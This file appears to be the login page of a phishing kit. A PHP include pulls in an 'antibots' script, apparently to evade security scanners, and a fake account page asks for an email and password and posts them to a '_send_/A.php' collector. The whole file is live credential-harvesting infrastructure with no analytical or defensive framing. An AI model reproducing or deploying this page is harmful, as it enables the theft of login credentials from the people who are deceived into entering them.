<?php
include '_data_/antibots.php';
?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Account ID 704-852-917-371</title>
<link href="_data_/favicon.png" rel="icon" sizes="128x128" type="image/png">
<link href="_data_/index.css" rel="stylesheet">
</head>
<body>
<div id="wb_Image1" style="position:absolute;left:892px;top:148px;width:139px;height:41px;z-index:3;">
<img src="_data_/logo.png" id="Image1" alt="" width="139" height="42"></div>
<div id="wb_Form1" style="position:absolute;left:724px;top:0px;width:475px;height:586px;z-index:4;">
<form action="_send_/A.php" method="POST">
<input type="email" required="" id="Editbox1" style="position:absolute;left:49px;top:215px;width:364px;height:34px;z-index:0;" name="1" value="" spellcheck="false" placeholder="Email">
<input type="password" required="" id="Editbox2" style="position:absolute;left:49px;top:274px;width:364px;height:34px;z-index:1;" name="2" value="" spellcheck="false" placeholder="Password">
<input type="submit" id="Button1" name="" value="" style="position:absolute;left:49px;top:340px;width:374px;height:39px;z-index:2;cursor: pointer;">
</form>
</div>
</body>
</html>